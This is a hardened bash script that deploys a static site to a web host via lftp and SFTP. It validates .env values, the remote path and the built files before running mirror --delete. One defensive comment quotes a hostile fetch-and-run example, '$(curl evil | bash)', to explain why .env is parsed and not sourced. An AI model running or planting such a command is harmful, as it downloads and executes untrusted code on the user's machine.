#!/usr/bin/env bash
# Deploy local _site/ to a webhotel via lftp + SFTP key auth.
# Usage: ./deploy.sh [LOCAL_DIR]                      (real deploy)
#        DRY_RUN=1 ./deploy.sh [LOCAL_DIR]            (preview only, no changes)
#
# Requires in .env (no quotes around values):
#   DEPLOY_HOST    e.g. login.domeneshop.no
#   DEPLOY_USER    your SFTP username
#   DEPLOY_REMOTE  remote target path, e.g. /home/N/x/user/yourdomain.tld
#   DEPLOY_KEY     path to private SSH key, e.g. /e/www/your_key
#                  (Git Bash forward-slash form; default ~/.ssh/id_ed25519)
#
# Optional in .env (both off unless set to 1; see docs/deploy.md):
#   DEPLOY_ALLOW_PATH_MISMATCH=1  DEPLOY_REMOTE's last folder is not named after
#                                 the site.json url (e.g. a host's 'www' folder)
#   DEPLOY_STRICT_HOSTKEY=1       only connect when the server's host key is
#                                 already in known_hosts (pinned)
#
# WARNING: --delete removes remote files that no longer exist locally —
# everything except the remote-only files in the EXCLUDES list below.
#
# Full guide: docs/deploy.md

set -euo pipefail

# Parse .env line-by-line instead of `source`-ing it: a `source` runs whatever bash
# is in the file (including command substitutions like FOO=$(curl evil | bash)) the
# moment we run the script. Anyone with write access to the project dir could plant
# that. Format expected: simple KEY=value, no quotes, comments start with '#'.
# Only the deploy keys listed in the `case` are accepted. Accepting ANY variable
# name would let a line like PATH=/somewhere swap in a fake lftp or ssh, or HOME=…
# redirect lftp's rc file and the default key path. Other keys are skipped with a
# warning (the key name is printed, never its value).
if [ -f .env ]; then
  while IFS='=' read -r key val; do
    key="${key%$'\r'}"
    val="${val%$'\r'}"
    [[ "$key" =~ ^[[:space:]]*$ ]] && continue   # blank line
    case "$key" in
      DEPLOY_HOST|DEPLOY_USER|DEPLOY_REMOTE|DEPLOY_KEY|DEPLOY_ALLOW_PATH_MISMATCH|DEPLOY_STRICT_HOSTKEY) ;;
      *) echo "deploy.sh: ignoring unknown .env key '$key'." >&2; continue ;;
    esac
    printf -v "$key" '%s' "$val"
    export "$key"
  done < <(grep -v '^[[:space:]]*#' .env)
fi

LOCAL_DIR="${1:-_site}"

: "${DEPLOY_HOST:?DEPLOY_HOST not set in .env}"
: "${DEPLOY_USER:?DEPLOY_USER not set in .env}"
: "${DEPLOY_REMOTE:?DEPLOY_REMOTE not set in .env}"
: "${DEPLOY_KEY:=$HOME/.ssh/id_ed25519}"

# These values are interpolated into an unquoted lftp heredoc below. lftp uses ';' as
# a command separator and '!' as shell-escape, so we reject anything outside a strict
# allowlist before it can reach the heredoc.
[[ "$DEPLOY_HOST"   =~ ^[A-Za-z0-9.-]+$        ]] || { echo "deploy.sh: DEPLOY_HOST contains invalid characters."   >&2; exit 1; }
[[ "$DEPLOY_USER"   =~ ^[A-Za-z0-9._-]+$       ]] || { echo "deploy.sh: DEPLOY_USER contains invalid characters."   >&2; exit 1; }
[[ "$DEPLOY_REMOTE" =~ ^[A-Za-z0-9._/~-]+$     ]] || { echo "deploy.sh: DEPLOY_REMOTE contains invalid characters." >&2; exit 1; }
case "$DEPLOY_KEY" in *\"*) echo "deploy.sh: DEPLOY_KEY may not contain quotes." >&2; exit 1;; esac

# --- Target sanity checks ---------------------------------------------------
# mirror --delete makes DEPLOY_REMOTE the most dangerous value in this script:
# whatever folder it names is made identical to LOCAL_DIR. A .env copied from
# another project, or a path missing its last folder (/home/N/x/user instead of
# /home/N/x/user/yourdomain.tld), would replace or delete ANOTHER site. So before
# lftp runs (dry-runs included) the path must look like this site's own folder.
#
# Absolute paths need at least this many folders: /home/user/public_html is 3,
# Domeneshop's /home/N/x/user/yourdomain.tld is 5. On a chrooted SFTP host whose
# docroot is just /www or /htdocs, lower it in that project's copy of this file
# and run DRY_RUN=1 before the first real deploy.
MIN_REMOTE_SEGMENTS=3

case "$DEPLOY_REMOTE" in
  */) echo "deploy.sh: DEPLOY_REMOTE must not end in '/' (got '$DEPLOY_REMOTE')." >&2; exit 1;;
esac
# Split "/home/N/x/user/site.tld" on '/' into an array of folder names.
IFS='/' read -r -a REMOTE_SEGS <<< "${DEPLOY_REMOTE#/}"
for seg in "${REMOTE_SEGS[@]}"; do
  case "$seg" in
    ''|.|..|'~'*) echo "deploy.sh: DEPLOY_REMOTE '$DEPLOY_REMOTE' contains an empty, '.', '..' or '~' folder. Write the plain full path." >&2; exit 1;;
  esac
done
if [ "${DEPLOY_REMOTE:0:1}" = "/" ] && [ "${#REMOTE_SEGS[@]}" -lt "$MIN_REMOTE_SEGMENTS" ]; then
  echo "deploy.sh: DEPLOY_REMOTE '$DEPLOY_REMOTE' is only ${#REMOTE_SEGS[@]} folder(s) deep — that looks like an account root, not a site folder. Refusing mirror --delete (see MIN_REMOTE_SEGMENTS)." >&2
  exit 1
fi

# site.json's url must be the real domain: the boilerplate placeholder would ship
# canonical, og:url and sitemap links that all point at example.com. node is
# already required for the build, so it reads the JSON here too.
SITE_HOST=$(node -e "process.stdout.write(new URL(require('./src/_data/site.json').url).hostname)" 2>/dev/null) || SITE_HOST=""
if [ -z "$SITE_HOST" ]; then
  echo "deploy.sh: could not read a valid \"url\" from src/_data/site.json (run this from the project root, with node on PATH)." >&2
  exit 1
fi
case "$SITE_HOST" in
  example.com|*.example.com|example.org|*.example.org|example.net|*.example.net)
    echo "deploy.sh: src/_data/site.json \"url\" is still the placeholder ($SITE_HOST). Set the real domain before deploying." >&2
    exit 1;;
esac

# The last folder of DEPLOY_REMOTE must be named after that host: the full host
# (example.com → /home/N/x/user/example.com) or its first label, for a subdomain
# (app.example.com → /home/N/x/user/subs/app). ${VAR,,} lowercases; ${VAR##*/}
# keeps what's after the last '/'; ${VAR%%.*} keeps what's before the first '.'.
REMOTE_LAST="${DEPLOY_REMOTE##*/}"
REMOTE_LAST="${REMOTE_LAST,,}"
BARE_HOST="${SITE_HOST#www.}"
if [ "$REMOTE_LAST" != "$BARE_HOST" ] && [ "$REMOTE_LAST" != "$SITE_HOST" ] && [ "$REMOTE_LAST" != "${BARE_HOST%%.*}" ]; then
  if [ "${DEPLOY_ALLOW_PATH_MISMATCH:-}" = "1" ]; then
    echo "deploy.sh: note: DEPLOY_REMOTE ends in '/$REMOTE_LAST', not '/$BARE_HOST' (allowed by DEPLOY_ALLOW_PATH_MISMATCH=1)." >&2
  else
    echo "deploy.sh: DEPLOY_REMOTE ends in '/$REMOTE_LAST', but site.json says this site is $SITE_HOST." >&2
    echo "  mirror --delete would make that folder identical to '$LOCAL_DIR' — refusing." >&2
    echo "  Expected the last folder to be '$BARE_HOST' (or '${BARE_HOST%%.*}' for a subdomain)." >&2
    echo "  If '$REMOTE_LAST' really is this site's docroot (e.g. a host's 'www' folder)," >&2
    echo "  set DEPLOY_ALLOW_PATH_MISMATCH=1 in .env and run DRY_RUN=1 before the real deploy." >&2
    exit 1
  fi
fi

if [ ! -f "$DEPLOY_KEY" ]; then
  echo "deploy.sh: SSH key not found at '$DEPLOY_KEY'." >&2
  exit 1
fi

if [ ! -d "$LOCAL_DIR" ]; then
  echo "deploy.sh: local dir '$LOCAL_DIR' does not exist. Did you run 'npm run build'?" >&2
  exit 1
fi

# Sentinel check: --delete will nuke the live site if LOCAL_DIR is empty or points
# at the wrong subdir. Require an index.html before we let lftp anywhere near --delete.
if [ ! -f "$LOCAL_DIR/index.html" ]; then
  echo "deploy.sh: '$LOCAL_DIR/index.html' missing — refusing to deploy (would --delete the live site)." >&2
  exit 1
fi

# Placeholder check on the BUILT files. The build only WARNS about template
# values in site.json (the boilerplate itself is full of them and must keep
# building), so this is where they're stopped before they go live:
#   - robots.txt / security.txt still naming example.com or yoursite.com
#     (site.json url, security.contact);
#   - security.txt's Expires less than 30 days away, or already passed
#     (RFC 9116: an expired file is invalid). node reads the date, because
#     `date -d` differs between Git Bash, Linux and macOS;
#   - the home page footer still saying "Your Name" / yoursite.com
#     (site.json footer.copyrightName / copyrightUrl).
# scripts/deploy-batch.mjs runs the same checks.
for f in robots.txt .well-known/security.txt; do
  if [ -f "$LOCAL_DIR/$f" ] && grep -Eqi 'example\.(com|org|net)|yoursite\.com' "$LOCAL_DIR/$f"; then
    echo "deploy.sh: '$LOCAL_DIR/$f' still contains example.com / yoursite.com. Fix src/_data/site.json (url, security.contact) and rebuild." >&2
    exit 1
  fi
done
if [ -f "$LOCAL_DIR/.well-known/security.txt" ]; then
  DAYS_LEFT=$(node -e "const m=require('fs').readFileSync(process.argv[1],'utf8').match(/^Expires:\s*(\S+)/mi);const d=m?new Date(m[1]):NaN;process.stdout.write(isNaN(d)?'':String(Math.floor((d-Date.now())/864e5)))" "$LOCAL_DIR/.well-known/security.txt" 2>/dev/null) || DAYS_LEFT=""
  if [ -n "$DAYS_LEFT" ] && [ "$DAYS_LEFT" -lt 30 ]; then
    echo "deploy.sh: security.txt Expires is $DAYS_LEFT day(s) away (under 30, or already passed). Set site.json security.expires to \"\" (build date + 1 year) or a date ~12 months ahead, and rebuild." >&2
    exit 1
  fi
fi
if grep -Eq 'Your Name|yoursite\.com' "$LOCAL_DIR/index.html"; then
  echo "deploy.sh: '$LOCAL_DIR/index.html' still says 'Your Name' or yoursite.com (site.json footer.copyrightName / copyrightUrl). Fix them and rebuild." >&2
  exit 1
fi

# Concurrency guard: prevent two simultaneous deploys from racing inside mirror --delete.
# flock is a util-linux tool and does NOT ship with Git for Windows, so in Git Bash
# (checked 2026-10-25: `command -v flock` finds nothing) this block is skipped and
# nothing stops a second deploy — don't start one while another is still running.
# Where flock exists (Linux, WSL) the guard works, and the trap removes the lock
# file when this script exits, so no stale .deploy.lock is left behind. (A leftover
# file never blocks flock anyway: the lock dies with the process that held it.)
if command -v flock >/dev/null 2>&1; then
  exec 9>./.deploy.lock
  flock -n 9 || { echo "deploy.sh: another deploy is already running." >&2; exit 1; }
  trap 'rm -f ./.deploy.lock' EXIT
fi

DRY_FLAG=""
MODE_LABEL="DEPLOY"
if [ "${DRY_RUN:-}" = "1" ]; then
  DRY_FLAG="--dry-run"
  MODE_LABEL="DRY-RUN (no changes will be made)"
fi

# --- Remote-only files: EXCLUDES ---------------------------------------------
# mirror --delete removes every remote file that isn't in LOCAL_DIR — including
# files that only ever exist on the server. lftp leaves anything matching an
# --exclude-glob alone on BOTH sides: it is not uploaded from LOCAL_DIR, and it is
# not deleted on the server. (Behaviour checked with lftp 4.9.2, 2026-10-25.)
#
# How lftp matches a pattern:
#   - no '/' in it: matched against the NAME, in every folder. '.htpasswd*'
#     protects /.htpasswd and /members/.htpasswd-site alike.
#   - with '/': matched against the END of the path, as many folders deep as the
#     pattern is. '.well-known/acme-challenge/*' protects that folder and its
#     contents. Never start a pattern with '/': it then matches nothing at all.
#   - an exclude only protects files inside folders that ALSO exist in LOCAL_DIR.
#     A remote folder that is missing locally is removed whole (rm -r), excluded
#     files and all. (.well-known/ is safe: the build always writes
#     .well-known/security.txt.)
#   - excluded files in LOCAL_DIR are not uploaded either. A google*.html you
#     commit to src/ would never ship — see docs/deploy.md.
#
# One line per path; uncomment or add as the project needs. Check every change
# with DRY_RUN=1: a protected file must not appear in the "Removing" lines.
# scripts/deploy-batch.mjs (npm run deploy:batch) reads the active EXCLUDES+=
# lines below, so this list is the ONE source of truth for both deploy paths.
EXCLUDES=""
EXCLUDES+=" --exclude-glob '.htpasswd*'"                   # Basic Auth password files, created on the server
EXCLUDES+=" --exclude-glob 'google*.html'"                 # Search Console HTML verification file, uploaded by hand
EXCLUDES+=" --exclude-glob 'BingSiteAuth.xml'"             # Bing Webmaster Tools verification file, uploaded by hand
EXCLUDES+=" --exclude-glob '.well-known/acme-challenge/*'" # Let's Encrypt HTTP-01 tokens, if the host writes them here
# EXCLUDES+=" --exclude-glob '_config/paths.php'"          # per-environment runtime config (PHP projects; see README)
# EXCLUDES+=" --exclude-glob 'api/data/*'"                 # data the live site writes itself
# EXCLUDES+=" --exclude-glob 'cgi-bin/*'"                  # folder cPanel hosts create inside public_html

echo "$MODE_LABEL"
echo "  Site  : https://$SITE_HOST"
echo "  Local : $LOCAL_DIR"
echo "  Remote: sftp://$DEPLOY_USER@$DEPLOY_HOST$DEPLOY_REMOTE"
echo "  Key   : $DEPLOY_KEY"
echo "  Keep  :${EXCLUDES// --exclude-glob / }"
echo

# lftp settings, one per line in the heredoc below:
#   cmd:fail-exit        stop at the first failed command instead of carrying on.
#   net:timeout 30       give up on a connection that has been silent for 30 s
#                        (lftp's default is 5 minutes) ...
#   net:max-retries 3    ... and stop after 3 tries (default 1000, i.e. retrying
#                        for days). Domeneshop sometimes throttles a burst of
#                        connections; the retries (15 s apart, growing 1.5x each
#                        time) ride that out, and if it still fails, simply run
#                        the deploy again.
#   sftp:connect-program the ssh command lftp runs. The host-key policy lives here
#                        in ssh, where it's visible, instead of lftp's old
#                        `sftp:auto-confirm yes` (which typed "yes" to ANY unknown
#                        host key, unseen):
#     -a -x                    no agent or X11 forwarding.
#     BatchMode=yes            never prompt. A key the server doesn't accept fails
#                              at once instead of hanging on an invisible password
#                              prompt (and there is no host-key question left for
#                              auto-confirm to answer).
#     IdentitiesOnly=yes       offer only DEPLOY_KEY (plus any IdentityFile set in
#                              ~/.ssh/config), not every key loaded in an agent.
#     StrictHostKeyChecking    accept-new (default): trust a server the first time
#                              and remember it in known_hosts, refuse it if its
#                              key ever CHANGES. yes (DEPLOY_STRICT_HOSTKEY=1):
#                              only hosts already in known_hosts, i.e. pinned
#                              during setup (docs/deploy.md).
#   mirror ... $EXCLUDES the remote-only files above are skipped on both sides.
HOSTKEY_POLICY="accept-new"
if [ "${DEPLOY_STRICT_HOSTKEY:-}" = "1" ]; then
  HOSTKEY_POLICY="yes"
fi

lftp <<EOF
set cmd:fail-exit yes;
set net:timeout 30;
set net:max-retries 3;
set sftp:connect-program "ssh -a -x -o BatchMode=yes -o IdentitiesOnly=yes -o StrictHostKeyChecking=$HOSTKEY_POLICY -i \"$DEPLOY_KEY\"";
open sftp://$DEPLOY_USER@$DEPLOY_HOST;
mirror --reverse --delete --verbose --no-perms --parallel=4 $EXCLUDES $DRY_FLAG "$LOCAL_DIR" "$DEPLOY_REMOTE";
bye
EOF

echo
if [ "${DRY_RUN:-}" = "1" ]; then
  echo "Dry-run complete. No changes were made. Re-run without DRY_RUN=1 to deploy for real."
else
  echo "Deploy complete."
fi
